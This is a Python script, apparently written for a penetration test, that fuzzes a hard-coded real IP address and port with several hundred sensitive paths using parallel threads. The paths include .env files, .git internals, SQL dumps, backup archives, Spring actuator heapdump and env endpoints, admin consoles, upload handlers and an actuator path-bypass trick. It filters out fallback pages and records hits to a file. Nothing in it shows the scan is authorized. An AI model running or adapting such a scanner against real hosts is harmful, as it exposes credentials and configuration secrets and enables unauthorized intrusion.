#!/usr/bin/env python3
import urllib.request, urllib.error, ssl, sys, time, json
from concurrent.futures import ThreadPoolExecutor

BASE = "http://144.123.22.234:9080"
FALLBACK = 5795

paths = []
def add(*xs):
    for x in xs:
        if x not in paths:
            paths.append(x)

# directories / roots
add("/html/", "/assets/", "/static/", "/public/", "/dist/", "/src/", "/upload/", "/uploads/",
    "/file/", "/files/", "/profile/", "/images/", "/img/", "/css/", "/js/", "/fonts/",
    "/ueditor/", "/druid/", "/manage/", "/api/", "/admin/", "/backup/", "/web/", "/webapp/",
    "/WEB-INF/", "/META-INF/", "/logs/", "/log/", "/temp/", "/tmp/", "/data/", "/conf/", "/config/",
    "/html/", "/www/", "/v1/", "/v2/", "/prod-api/", "/dev-api/", "/doc/", "/docs/", "/test/",
    "/demo/", "/bin/", "/lib/", "/system/", "/monitor/", "/tool/", "/actuator/", "/swagger/",
    "/ueditor/php/", "/ueditor/jsp/", "/ueditor/net/")

# files
add("/backup.zip", "/www.zip", "/web.zip", "/site.zip", "/dist.zip", "/html.zip", "/db.sql", "/dump.sql",
    "/backup.sql", "/data.sql", "/test.txt", "/1.txt", "/README.md", "/CHANGELOG.md", "/LICENSE",
    "/package.json", "/yarn.lock", "/pnpm-lock.yaml", "/vite.config.js", "/vue.config.js", "/config.js",
    "/app.config.js", "/env.js", "/settings.js", "/static/config.js", "/assets/config.js",
    "/.env", "/.env.local", "/.env.production", "/.env.dev", "/.git/HEAD", "/.git/config", "/.git/index",
    "/.gitignore", "/.svn/entries", "/.hg/hgrc", "/.DS_Store", "/.dockerenv", "/.dockerignore",
    "/docker-compose.yml", "/docker-compose.yaml", "/Dockerfile", "/application.yml", "/application.yaml",
    "/application.properties", "/bootstrap.yml", "/bootstrap.yaml", "/nginx.conf", "/conf/nginx.conf",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/.well-known/security.txt", "/favicon.ico",
    "/logo.png", "/index.html", "/index.htm", "/login.html", "/error.html", "/404.html", "/500.html",
    "/main.js", "/app.js", "/chunk-vendors.js", "/static/js/app.js",
    "/swagger-ui.html", "/swagger-ui/index.html", "/swagger-resources", "/doc.html", "/v2/api-docs",
    "/v3/api-docs", "/api-docs", "/openapi.json", "/openapi.yaml", "/webjars/springfox-swagger-ui/index.html",
    "/druid/index.html", "/druid/login.html", "/druid/websession.json",
    "/actuator", "/actuator/health", "/actuator/env", "/actuator/heapdump", "/actuator/beans",
    "/actuator/metrics", "/actuator/mappings", "/actuator/configprops", "/actuator/info", "/actuator/loggers",
    "/health", "/env", "/metrics", "/heapdump", "/jolokia", "/trace", "/threaddump", "/beans", "/info",
    "/nginx_status", "/nginx-status", "/status", "/server-status", "/server-info",
    "/phpinfo.php", "/phpinfo", "/info.php", "/adminer.php", "/phpmyadmin/", "/pma/", "/mysql/",
    "/jmx-console/", "/console/", "/manager/html", "/host-manager/html",
    "/ueditor/index.html", "/ueditor/ueditor.config.js", "/ueditor/php/controller.php",
    "/ueditor/jsp/controller.jsp", "/ueditor/net/controller.ashx", "/kindeditor/", "/ckeditor/",
    "/ueditor/php/", "/upload.html", "/uploadFile", "/uploadfile", "/ueditor/php/upload/json/file/",
    "/profile/upload", "/upload/upload", "/api/upload", "/api/v1/upload", "/file/upload",
    "/test/", "/test.txt", "/abc.txt", "/1.js", "/1.html", "/test.html",
    "/auth/code", "/auth/tenant/list", "/login", "/index", "/register", "/404", "/dashboard",
    "/prod-api", "/prod-api/", "/prod-api/auth/code", "/prod-api/actuator/health", "/dev-api/auth/code",
    "/favicon.svg", "/vite.svg", "/manifest.json", "/assets/index-BbGssDPT.js", "/html/ie.html",
    "/system/oss/config", "/resource/oss/config/list", "/oss/config", "/minio/", "/minio/health/live",
    "/nacos/", "/nacos/v1/console/health/readiness", "/sentinel/", "/xxl-job-admin/", "/jenkins/",
    "/gitlab/", "/.idea/workspace.xml", "/.vscode/settings.json", "/composer.json", "/web.config",
    "/WEB-INF/web.xml", "/META-INF/context.xml", "/META-INF/maven/", "/.git/logs/HEAD",
    "/.git/refs/heads/master", "/.git/packed-refs", "/static/", "/assets/", "/css/index.css",
    "/js/index.js", "/img/logo.png", "/fonts/element-icons.woff", "/npm/", "/node_modules/",
    "/actuator;.js/health", "/prod-api/actuator;.js/health", "/prod-api/system/user/getInfo",
    "/swagger-resources/configuration/ui", "/swagger-resources/configuration/security",
    "/api/auth/code", "/admin/login", "/manage/login", "/static/index.html", "/dist/index.html",
    "/upload/images/", "/file/download", "/common/download", "/common/download/resource",
    "/doc/", "/druid/css/index.css", "/tool/gen", "/monitor/online", "/system/user/list",
    )

seen = []
out = []

def probe(p):
    url = BASE + p
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0 (pentest)"})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read(4000)
            status = r.status
            ct = r.headers.get("Content-Type", "")
            cl = r.headers.get("Content-Length", "")
            bodylen = len(body)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2000)
        except Exception:
            body = b""
        status = e.code; ct = e.headers.get("Content-Type", ""); cl = e.headers.get("Content-Length", ""); bodylen = len(body)
    except Exception as e:
        return (p, "ERR", str(e), "", "", "")
    snippet = body[:80].decode("utf-8", "replace").replace("\n", " ").replace("\r", "")
    return (p, status, cl, ct, bodylen, snippet)

with ThreadPoolExecutor(max_workers=6) as ex:
    for i, res in enumerate(ex.map(probe, paths)):
        out.append(res)
        p, status, cl, ct, blen, snip = res
        fallback = (str(cl) == str(FALLBACK)) or (blen >= FALLBACK and "text/html" in str(ct) and "<!doctype html>" in snip.lower())
        if not fallback:
            print("HIT", p, status, cl, ct, "|", snip[:70], flush=True)
        time.sleep(0.05)

with open("fuzz_results.tsv", "w") as f:
    for r in out:
        f.write("\t".join(str(x) for x in r) + "\n")
print("total", len(out))
